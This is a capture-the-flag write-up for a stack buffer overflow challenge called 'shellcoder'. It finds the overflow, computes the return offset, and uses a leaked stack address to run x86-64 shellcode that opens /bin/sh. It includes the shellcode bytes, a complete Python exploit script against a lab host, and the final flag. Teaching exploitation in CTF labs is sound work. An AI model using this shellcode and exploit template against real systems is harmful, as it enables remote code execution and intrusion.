<img width="417" height="590" alt="Screenshot 2026-07-12 080645" src="https://github.com/user-attachments/assets/bd00efbf-f43d-4e89-a0a5-ea8d79f139e1" />

<h2>Steps</h2>

<h3>Step 1 — Check the Binary Protections</h3>

<p>Use <strong>checksec</strong> to inspect the binary protections:</p>

<pre>checksec --file=shellcoder</pre>

<p>Alternatively, check the stack permissions using:</p>

<pre>readelf -l shellcoder | grep GNU_STACK</pre>

<p>The important results are:</p>

<table>
<tr>
<th>Protection</th>
<th>Status</th>
<th>Meaning</th>
</tr>
<tr>
<td>Stack Canary</td>
<td>Disabled</td>
<td>The overflow is not protected by a stack cookie.</td>
</tr>
<tr>
<td>NX</td>
<td>Disabled</td>
<td>The stack is executable.</td>
</tr>
<tr>
<td>PIE</td>
<td>Disabled</td>
<td>The binary uses fixed code addresses.</td>
</tr>
</table>

<p>The <strong>GNU_STACK</strong> segment has RWX permissions, meaning shellcode placed on the stack can be executed.</p>

<h3>Step 2 — Analyse the Vulnerable Function</h3>

<p>Open the binary in Ghidra, IDA, or use <strong>objdump</strong>:</p>

<pre>objdump -d shellcoder</pre>

<p>The vulnerable function contains logic similar to:</p>

<pre>char buf[0x100];

printf("Drop your payload here -&gt; %p\n", buf);

puts("Bring your own code...");

read(0, buf, 0x180);</pre>

<p>The buffer is only:</p>

<pre>0x100 bytes = 256 bytes</pre>

<p>However, the program reads:</p>

<pre>0x180 bytes = 384 bytes</pre>

<p>This creates a stack buffer overflow.</p>

<h3>Step 3 — Calculate the Return Address Offset</h3>

<p>The stack layout is:</p>

<pre>256-byte buffer
8-byte saved RBP
8-byte return address</pre>

<p>Therefore, the offset from the beginning of the buffer to the saved return address is:</p>

<pre>0x100 + 0x8 = 0x108 bytes</pre>

<p>The return address must be overwritten after exactly <strong>0x108 bytes</strong>.</p>

<h3>Step 4 — Use the Leaked Buffer Address</h3>

<p>The program prints the location of the stack buffer:</p>

<pre>Drop your payload here -&gt; 0x7fff...</pre>

<p>This address changes because of ASLR, but the program leaks the correct address during every connection.</p>

<p>The exploit can therefore overwrite the return address with the leaked buffer address.</p>

<h3>Step 5 — Prepare the Shellcode</h3>

<p>Use x86-64 shellcode that executes:</p>

<pre>execve("/bin/sh", NULL, NULL)</pre>

<p>The assembly logic is:</p>

<pre>xor rsi, rsi
push rsi
mov rdi, 0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 0x3b
pop rax
cdq
syscall</pre>

<p>The equivalent shellcode bytes are:</p>

<pre>SHELLCODE = (
    b"\x48\x31\xf6\x56"
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
)</pre>

<h3>Step 6 — Build the Payload</h3>

<p>The payload layout is:</p>

<pre>[ shellcode ]
[ padding until offset 0x108 ]
[ leaked buffer address ]</pre>

<p>When the vulnerable function returns, the CPU jumps back to the beginning of the stack buffer and executes the shellcode.</p>

<p>The payload can be created using:</p>

<pre>payload = SHELLCODE.ljust(0x108, b"A")
payload += struct.pack("&lt;Q", buffer_address)</pre>

<p>The address is packed using little-endian format because the binary uses x86-64 architecture.</p>

<h3>Step 7 — Create the Exploit Script</h3>

<pre>import re
import socket
import struct

HOST = "10.5.14.225"
PORT = 30017

SHELLCODE = (
    b"\x48\x31\xf6\x56"
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
)

sock = socket.create_connection((HOST, PORT))

data = b""

while b"Bring your own code" not in data:
    chunk = sock.recv(4096)

    if not chunk:
        raise RuntimeError("Connection closed before receiving the leak")

    data += chunk

print(data.decode(errors="ignore"))

match = re.search(
    rb"-&gt; (0x[0-9a-fA-F]+)",
    data
)

if match is None:
    match = re.search(
        rb"-> (0x[0-9a-fA-F]+)",
        data
    )

if match is None:
    raise RuntimeError("Failed to locate the leaked buffer address")

buffer_address = int(match.group(1), 16)

print("Leaked buffer address:", hex(buffer_address))

payload = SHELLCODE.ljust(0x108, b"A")
payload += struct.pack("&lt;Q", buffer_address)

sock.sendall(payload)

sock.sendall(b"cat flag.txt\n")

while True:
    output = sock.recv(4096)

    if not output:
        break

    print(output.decode(errors="ignore"), end="")</pre>

<h3>Step 8 — Run the Exploit</h3>

<p>Run the Python script:</p>

<pre>python exploit_shellcoder.py</pre>

<p>The script performs the following actions:</p>

<pre>1. Connects to the challenge server
2. Receives the leaked stack-buffer address
3. Places shellcode at the beginning of the payload
4. Adds padding until offset 0x108
5. Overwrites the return address with the leaked buffer address
6. Executes /bin/sh
7. Sends cat flag.txt</pre>

<h3>Step 9 — Retrieve the Flag</h3>

<p>After the vulnerable function returns, the shellcode executes and starts a shell.</p>

<p>The exploit then reads the flag using:</p>

<pre>cat flag.txt</pre>

<h2>Final Flag</h2>

<pre>OPUCC{my_f1rst_sh3llc0d3_0n_4n_3x3c_st4ck}</pre>
